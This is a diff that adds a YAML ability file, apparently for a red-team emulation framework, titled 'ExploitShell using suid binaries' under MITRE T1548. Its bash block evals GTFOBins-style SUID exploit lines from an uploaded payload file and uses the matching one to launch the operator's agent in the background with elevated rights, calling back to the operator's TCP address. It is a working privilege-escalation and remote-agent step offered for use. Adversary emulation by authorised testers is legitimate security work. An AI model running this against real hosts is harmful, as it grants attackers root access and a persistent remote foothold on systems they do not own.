@@ -1,0 +1,26 @@
+id: 59110299-7a6c-4f66-a1a1-3fe755f3cd76
+name: ExploitShell using suid binaries
+description: Followup TTP to the other one I'm just testing I'll figure it out.
+tactic: privilege-escalation
+technique:
+  id: T1548
+  name: Abuse Elevation Control Mechanism
+platforms:
+  linux:
+    bash:
+      command: |-
+        eval "suidGTFO=($(cat payload.txt | tr '\n' ' '))"
+        for ((suid = 0; suid < ${#suidGTFO[@]}; suid++));do
+            if [[ "${suidGTFO[$suid]}" == *"#{json.T1548.suid}"* ]]; then
+                echo "Exploiting using command:" ${suidGTFO[$suid]}
+                echo 'nohup #{agent.location} -address #{operator.tcp} -range elevated >/dev/null 2>&1 &' | eval ${suidGTFO[$suid]}
+                fi
+            done;
+      payload: '#{operator.payloads}/uploads/payload.txt'
+metadata:
+  authors:
+    - Gerbsec
+  tags:
+    - SUID GTFOBINS
+  themes: []
+  enabled: true
